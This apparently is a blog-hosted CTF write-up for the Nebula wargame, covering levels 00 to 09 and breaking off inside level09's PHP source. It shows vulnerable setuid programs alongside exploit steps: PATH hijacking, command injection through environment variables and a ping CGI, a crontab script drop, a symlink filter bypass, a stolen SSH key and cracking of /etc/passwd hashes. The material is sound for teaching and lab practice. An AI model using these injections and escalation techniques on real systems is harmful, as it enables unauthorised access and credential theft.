@@ -1,0 +1,963 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Pwn," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/X.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="Nebula Writeup.md  level00 About Key Points Writeup   level 01 About SourceCode Key Points Writeup   level02 About SourceCode Key Points Writeups   level03 About SourceCode Key Points Writeups   level">
+<meta name="keywords" content="Pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nebula">
+<meta property="og:url" content="http://yoursite.com/CTF/Writeup/Nebula/index.html">
+<meta property="og:site_name" content="Xu&#39;s Blog">
+<meta property="og:description" content="Nebula Writeup.md  level00 About Key Points Writeup   level 01 About SourceCode Key Points Writeup   level02 About SourceCode Key Points Writeups   level03 About SourceCode Key Points Writeups   level">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-08-08T08:42:45.180Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Nebula">
+<meta name="twitter:description" content="Nebula Writeup.md  level00 About Key Points Writeup   level 01 About SourceCode Key Points Writeup   level02 About SourceCode Key Points Writeups   level03 About SourceCode Key Points Writeups   level">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/CTF/Writeup/Nebula/"/>
+
+
+
+
+
+  <title>Nebula | Xu's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <a href="https://github.com/XuCcc"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/38ef81f8aca64bb9a64448d0d70f1308ef5341ab/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f6461726b626c75655f3132313632312e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png"></a>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Xu's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/CTF/Writeup/Nebula/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Xu">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xu's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Nebula</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-08T16:39:41+08:00">
+                2017-08-08
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2017-08-08T16:42:45+08:00">
+                2017-08-08
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/Writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">Writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Nebula-Writeup-md"><a href="#Nebula-Writeup-md" class="headerlink" title="Nebula Writeup.md"></a>Nebula Writeup.md</h1><!-- MarkdownTOC -->
+<ul>
+<li><a href="#level00">level00</a><ul>
+<li><a href="#about">About</a></li>
+<li><a href="#key-points">Key Points</a></li>
+<li><a href="#writeup">Writeup</a></li>
+</ul>
+</li>
+<li><a href="#level-01">level 01</a><ul>
+<li><a href="#about-1">About</a></li>
+<li><a href="#sourcecode">SourceCode</a></li>
+<li><a href="#key-points-1">Key Points</a></li>
+<li><a href="#writeup-1">Writeup</a></li>
+</ul>
+</li>
+<li><a href="#level02">level02</a><ul>
+<li><a href="#about-2">About</a></li>
+<li><a href="#sourcecode-1">SourceCode</a></li>
+<li><a href="#key-points-2">Key Points</a></li>
+<li><a href="#writeups">Writeups</a></li>
+</ul>
+</li>
+<li><a href="#level03">level03</a><ul>
+<li><a href="#about-3">About</a></li>
+<li><a href="#sourcecode-2">SourceCode</a></li>
+<li><a href="#key-points-3">Key Points</a></li>
+<li><a href="#writeups-1">Writeups</a></li>
+</ul>
+</li>
+<li><a href="#level04">level04</a><ul>
+<li><a href="#about-4">About</a></li>
+<li><a href="#sourcecode-3">SourceCode</a></li>
+<li><a href="#key-points-4">Key Points</a></li>
+<li><a href="#writeups-2">Writeups</a></li>
+</ul>
+</li>
+<li><a href="#level05">level05</a><ul>
+<li><a href="#about-5">About</a></li>
+<li><a href="#key-points-5">Key Points</a></li>
+<li><a href="#writeups-3">Writeups</a></li>
+</ul>
+</li>
+<li><a href="#level06">level06</a><ul>
+<li><a href="#about-6">About</a></li>
+<li><a href="#key-points-6">Key Points</a></li>
+<li><a href="#witeups">Witeups</a></li>
+</ul>
+</li>
+<li><a href="#level07">level07</a><ul>
+<li><a href="#about-7">About</a></li>
+<li><a href="#sourcecode-4">SourceCode</a></li>
+<li><a href="#key-points-7">Key Points</a></li>
+<li><a href="#writeups-4">Writeups</a></li>
+</ul>
+</li>
+<li><a href="#level08">level08</a><ul>
+<li><a href="#about-8">About</a></li>
+<li><a href="#key-points-8">key Points</a></li>
+<li><a href="#writeups-5">Writeups</a></li>
+</ul>
+</li>
+<li><a href="#level09">level09</a><ul>
+<li><a href="#about-9">ABout</a></li>
+<li><a href="#sourcecode-5">SourceCode</a></li>
+<li><a href="#key--points">key  Points</a></li>
+</ul>
+</li>
+</ul>
+<!-- /MarkdownTOC -->
+<h2 id="level00"><a href="#level00" class="headerlink" title="level00"></a>level00</h2><h3 id="About"><a href="#About" class="headerlink" title="About"></a>About</h3><p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p>
+<p>Alternatively, look at the find man page.</p>
+<p>To access this level, log in as level00 with the password of level00.</p>
+<h3 id="Key-Points"><a href="#Key-Points" class="headerlink" title="Key Points"></a>Key Points</h3><ul>
+<li>find</li>
+<li>uid</li>
+</ul>
+<h3 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h3><ul>
+<li>Step 1</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">level00@nebula:~$ id flag00</div><div class="line">uid=999(flag00) gid=999(flag00) groups=999(flag00)</div></pre></td></tr></table></figure>
+<ul>
+<li>Step 2</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">level00@nebula:~$ find / -uid 999 2&gt;/dev/null</div><div class="line">/bin/.../flag00</div><div class="line">/home/flag00</div><div class="line">/home/flag00/.bash_logout</div><div class="line">/home/flag00/.bashrc</div><div class="line">/home/flag00/.profile</div><div class="line">/rofs/bin/.../flag00</div><div class="line">/rofs/home/flag00</div><div class="line">/rofs/home/flag00/.bash_logout</div><div class="line">/rofs/home/flag00/.bashrc</div><div class="line">/rofs/home/flag00/.profile</div></pre></td></tr></table></figure>
+<ul>
+<li>Step 3</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">level00@nebula:~$ /bin/.../flag00 </div><div class="line">Congrats, now run getflag to get your flag!</div><div class="line">flag00@nebula:~$ getflag</div><div class="line">You have successfully executed getflag on a target account</div></pre></td></tr></table></figure>
+<h2 id="level-01"><a href="#level-01" class="headerlink" title="level 01"></a>level 01</h2><h3 id="About-1"><a href="#About-1" class="headerlink" title="About"></a>About</h3><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>
+<p>To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.</p>
+<h3 id="SourceCode"><a href="#SourceCode" class="headerlink" title="SourceCode"></a>SourceCode</h3><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">gid_t</span> gid;</div><div class="line">  <span class="keyword">uid_t</span> uid;</div><div class="line">  gid = getegid();</div><div class="line">  uid = geteuid();</div><div class="line"></div><div class="line">  setresgid(gid, gid, gid);</div><div class="line">  setresuid(uid, uid, uid);</div><div class="line"></div><div class="line">  system(<span class="string">"/usr/bin/env echo and now what?"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="Key-Points-1"><a href="#Key-Points-1" class="headerlink" title="Key Points"></a>Key Points</h3><ul>
+<li><code>env</code></li>
+<li><a href="http://www.linuxidc.com/Linux/2015-01/111459.htm" target="_blank" rel="external">修改环境变量</a></li>
+</ul>
+<h3 id="Writeup-1"><a href="#Writeup-1" class="headerlink" title="Writeup"></a>Writeup</h3><ul>
+<li>Step 1</li>
+</ul>
+<p><code>level01@nebula:~$ ln -s /bin/getflag  echo</code></p>
+<ul>
+<li>Step 2 </li>
+</ul>
+<p><code>level01@nebula:~$ export PATH=/home/level01:$PATH</code></p>
+<ul>
+<li>Step 3</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">level01@nebula:~$ ../flag01/flag01 </div><div class="line">You have successfully executed getflag on a target account</div></pre></td></tr></table></figure>
+<h2 id="level02"><a href="#level02" class="headerlink" title="level02"></a>level02</h2><h3 id="About-2"><a href="#About-2" class="headerlink" title="About"></a>About</h3><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>
+<p>To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.</p>
+<h3 id="SourceCode-1"><a href="#SourceCode-1" class="headerlink" title="SourceCode"></a>SourceCode</h3><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> *buffer;</div><div class="line"></div><div class="line">  <span class="keyword">gid_t</span> gid;</div><div class="line">  <span class="keyword">uid_t</span> uid;</div><div class="line"></div><div class="line">  gid = getegid();</div><div class="line">  uid = geteuid();</div><div class="line"></div><div class="line">  setresgid(gid, gid, gid);</div><div class="line">  setresuid(uid, uid, uid);</div><div class="line"></div><div class="line">  buffer = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">  asprintf(&amp;buffer, <span class="string">"/bin/echo %s is cool"</span>, getenv(<span class="string">"USER"</span>));</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"about to call system(\"%s\")\n"</span>, buffer);</div><div class="line">  </div><div class="line">  system(buffer);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="Key-Points-2"><a href="#Key-Points-2" class="headerlink" title="Key Points"></a>Key Points</h3><ul>
+<li>环境变量</li>
+</ul>
+<h3 id="Writeups"><a href="#Writeups" class="headerlink" title="Writeups"></a>Writeups</h3><ul>
+<li>Step 1</li>
+</ul>
+<p><code>level02@nebula:~$ export USER=&quot;&amp;&amp; /bin/getflag&quot;</code></p>
+<h2 id="level03"><a href="#level03" class="headerlink" title="level03"></a>level03</h2><h3 id="About-3"><a href="#About-3" class="headerlink" title="About"></a>About</h3><p>Check the home directory of flag03 and take note of the files there.</p>
+<p>There is a crontab that is called every couple of minutes.</p>
+<p>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.</p>
+<h3 id="SourceCode-2"><a href="#SourceCode-2" class="headerlink" title="SourceCode"></a>SourceCode</h3><figure class="highlight sh"><table><tr><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> /home/flag03/writable.d/* ; <span class="keyword">do</span></div><div class="line">    (<span class="built_in">ulimit</span> -t 5; bash -x <span class="string">"<span class="variable">$i</span>"</span>)</div><div class="line">    rm -f <span class="string">"<span class="variable">$i</span>"</span></div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
+<h3 id="Key-Points-3"><a href="#Key-Points-3" class="headerlink" title="Key Points"></a>Key Points</h3><ul>
+<li><a href="http://www.jb51.net/LINUXjishu/151805.html" target="_blank" rel="external">Crontab</a></li>
+<li>shell脚本</li>
+</ul>
+<h3 id="Writeups-1"><a href="#Writeups-1" class="headerlink" title="Writeups"></a>Writeups</h3><ul>
+<li><code>/home/flag03/writable.d</code> 下建一个可执行脚本</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">level03@nebula:/home/flag03/writable.d$ echo "/bin/getflag &gt; /tmp/flag" &gt; test.sh</div></pre></td></tr></table></figure>
+<p>PS:</p>
+<ul>
+<li><code>sudo ls /var/spool/cron/crontabs</code></li>
+</ul>
+<h2 id="level04"><a href="#level04" class="headerlink" title="level04"></a>level04</h2><h3 id="About-4"><a href="#About-4" class="headerlink" title="About"></a>About</h3><p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>
+<p>To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.</p>
+<h3 id="SourceCode-3"><a href="#SourceCode-3" class="headerlink" title="SourceCode"></a>SourceCode</h3><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> buf[<span class="number">1024</span>];</div><div class="line">  <span class="keyword">int</span> fd, rc;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(argc == <span class="number">1</span>) &#123;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"%s [file to read]\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">      <span class="built_in">exit</span>(EXIT_FAILURE);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(<span class="built_in">strstr</span>(argv[<span class="number">1</span>], <span class="string">"token"</span>) != <span class="literal">NULL</span>) &#123;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"You may not access '%s'\n"</span>, argv[<span class="number">1</span>]);</div><div class="line">      <span class="built_in">exit</span>(EXIT_FAILURE);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  fd = open(argv[<span class="number">1</span>], O_RDONLY);</div><div class="line">  <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</div><div class="line">      err(EXIT_FAILURE, <span class="string">"Unable to open %s"</span>, argv[<span class="number">1</span>]);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  rc = read(fd, buf, <span class="keyword">sizeof</span>(buf));</div><div class="line">  </div><div class="line">  <span class="keyword">if</span>(rc == <span class="number">-1</span>) &#123;</div><div class="line">      err(EXIT_FAILURE, <span class="string">"Unable to read fd %d"</span>, fd);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  write(<span class="number">1</span>, buf, rc);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="Key-Points-4"><a href="#Key-Points-4" class="headerlink" title="Key Points"></a>Key Points</h3><ul>
+<li><code>strstr</code></li>
+</ul>
+<h3 id="Writeups-2"><a href="#Writeups-2" class="headerlink" title="Writeups"></a>Writeups</h3><ul>
+<li>Step 1</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">level04@nebula:/tmp$ ln -s /home/flag04/token flag04</div><div class="line">level04@nebula:/tmp$ /home/flag04/flag04 /tmp/flag04</div><div class="line">06508b5e-8909-4f38-b630-fdb148a848a2</div></pre></td></tr></table></figure>
+<ul>
+<li>Step 2</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">nebula@nebula:~$ su flag04</div><div class="line">Password: </div><div class="line">sh-4.2$ getflag</div><div class="line">You have successfully executed getflag on a target account</div></pre></td></tr></table></figure>
+<h2 id="level05"><a href="#level05" class="headerlink" title="level05"></a>level05</h2><h3 id="About-5"><a href="#About-5" class="headerlink" title="About"></a>About</h3><p>Check the flag05 home directory. You are looking for weak directory permissions</p>
+<p>To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.</p>
+<h3 id="Key-Points-5"><a href="#Key-Points-5" class="headerlink" title="Key Points"></a>Key Points</h3><ul>
+<li>ssh </li>
+</ul>
+<h3 id="Writeups-3"><a href="#Writeups-3" class="headerlink" title="Writeups"></a>Writeups</h3><ul>
+<li>Step 1</li>
+</ul>
+<p><code>level05@nebula:/home/flag05/.backup$ tar xvf backup-19072011.tgz -C /tmp/</code></p>
+<ul>
+<li>Step 2</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">level05@nebula:~$ cp -r /tmp/.ssh/ ~</div><div class="line">level05@nebula:~$ ssh flag05@localhost</div></pre></td></tr></table></figure>
+<h2 id="level06"><a href="#level06" class="headerlink" title="level06"></a>level06</h2><h3 id="About-6"><a href="#About-6" class="headerlink" title="About"></a>About</h3><p>The flag06 account credentials came from a legacy unix system.</p>
+<p>To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06.</p>
+<h3 id="Key-Points-6"><a href="#Key-Points-6" class="headerlink" title="Key Points"></a>Key Points</h3><h3 id="Witeups"><a href="#Witeups" class="headerlink" title="Witeups"></a>Witeups</h3><ul>
+<li>Step 1</li>
+</ul>
+<p>copy出<code>/etc/passwd</code>文件    </p>
+<ul>
+<li>Step 2</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">➜  Desktop john passwd </div><div class="line">Using default input encoding: UTF-8</div><div class="line">Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX-16])</div><div class="line">Press 'q' or Ctrl-C to abort, almost any other key for status</div><div class="line">hello            (flag06)</div><div class="line">1g 0:00:00:00 DONE 2/3 (2017-06-25 15:41) 25.00g/s 18750p/s 18750c/s 18750C/s 123456..marley</div><div class="line">Use the "--show" option to display all of the cracked passwords reliably</div><div class="line">Session completed</div></pre></td></tr></table></figure>
+<h2 id="level07"><a href="#level07" class="headerlink" title="level07"></a>level07</h2><h3 id="About-7"><a href="#About-7" class="headerlink" title="About"></a>About</h3><p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>
+<p>To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.</p>
+<h3 id="SourceCode-4"><a href="#SourceCode-4" class="headerlink" title="SourceCode"></a>SourceCode</h3><figure class="highlight perl"><table><tr><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/perl</span></div><div class="line"></div><div class="line"><span class="keyword">use</span> CGI <span class="string">qw&#123;param&#125;</span>;</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">ping</span> </span>&#123;</div><div class="line">  $host = $_[<span class="number">0</span>];</div><div class="line"></div><div class="line">  <span class="keyword">print</span>(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;"</span>);</div><div class="line"></div><div class="line">  @output = <span class="string">`ping -c 3 $host 2&gt;&amp;1`</span>;</div><div class="line">  <span class="keyword">foreach</span> $line (@output) &#123; <span class="keyword">print</span> <span class="string">"$line"</span>; &#125;</div><div class="line"></div><div class="line">  <span class="keyword">print</span>(<span class="string">"&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;"</span>);</div><div class="line">  </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment"># check if Host set. if not, display normal page, etc</span></div><div class="line"></div><div class="line">ping(param(<span class="string">"Host"</span>))</div></pre></td></tr></table></figure>
+<h3 id="Key-Points-7"><a href="#Key-Points-7" class="headerlink" title="Key Points"></a>Key Points</h3><h3 id="Writeups-4"><a href="#Writeups-4" class="headerlink" title="Writeups"></a>Writeups</h3><p><code>127.0.0.1;getflag</code></p>
+<h2 id="level08"><a href="#level08" class="headerlink" title="level08"></a>level08</h2><h3 id="About-8"><a href="#About-8" class="headerlink" title="About"></a>About</h3><p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>
+<p>To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.</p>
+<h3 id="key-Points"><a href="#key-Points" class="headerlink" title="key Points"></a>key Points</h3><p><code>7f</code> –&gt; <code>del</code></p>
+<h3 id="Writeups-5"><a href="#Writeups-5" class="headerlink" title="Writeups"></a>Writeups</h3><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">000000D5  01                                               .</div><div class="line">000000D6  00 0d 0a 50 61 73 73 77  6f 72 64 3a 20          ...Passw ord:</div><div class="line">000000B9  62                                               b</div><div class="line">000000BA  61                                               a</div><div class="line">000000BB  63                                               c</div><div class="line">000000BC  6b                                               k</div><div class="line">000000BD  64                                               d</div><div class="line">000000BE  6f                                               o</div><div class="line">000000BF  6f                                               o</div><div class="line">000000C0  72                                               r</div><div class="line">000000C1  7f                                               .</div><div class="line">000000C2  7f                                               .</div><div class="line">000000C3  7f                                               .</div><div class="line">000000C4  30                                               0</div><div class="line">000000C5  30                                               0</div><div class="line">000000C6  52                                               R</div><div class="line">000000C7  6d                                               m</div><div class="line">000000C8  38                                               8</div><div class="line">000000C9  7f                                               .</div><div class="line">000000CA  61                                               a</div><div class="line">000000CB  74                                               t</div><div class="line">000000CC  65                                               e</div><div class="line">000000CD  0d                                               .</div></pre></td></tr></table></figure>
+<p>Password is <strong>backd00Rmate</strong></p>
+<h2 id="level09"><a href="#level09" class="headerlink" title="level09"></a>level09</h2><h3 id="ABout"><a href="#ABout" class="headerlink" title="ABout"></a>ABout</h3><p>There’s a C setuid wrapper for some vulnerable PHP code…</p>
+<p>To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.</p>
+<h3 id="SourceCode-5"><a href="#SourceCode-5" class="headerlink" title="SourceCode"></a>SourceCode</h3><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">spam</span><span class="params">($email)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  $email = preg_replace(<span class="string">"/\./"</span>, <span class="string">" dot "</span>, $email);</div><div class="line">  $email = preg_replace(<span class="string">"/@/"</span>, <span class="string">" AT "</span>, $email);</div><div class="line">  </div><div class="line">  <span class="keyword">return</span> $email;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">markup</span><span class="params">($filename, $use_me)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  $contents = file_get_contents($filename);</div><div class="line"></div><div class="line">  $contents = preg_replace(<span class="string">"/(\[email (.*)\])/e"</span>, <span class="string">"spam(\"\\2\")"</span>, $contents);</div><div class="line">  $contents = preg_replace(<span class="string">"/\[/"</span>, <span class="string">"&lt;"</span>, $contents);</div><div class="line">  $contents = preg_replace(<span 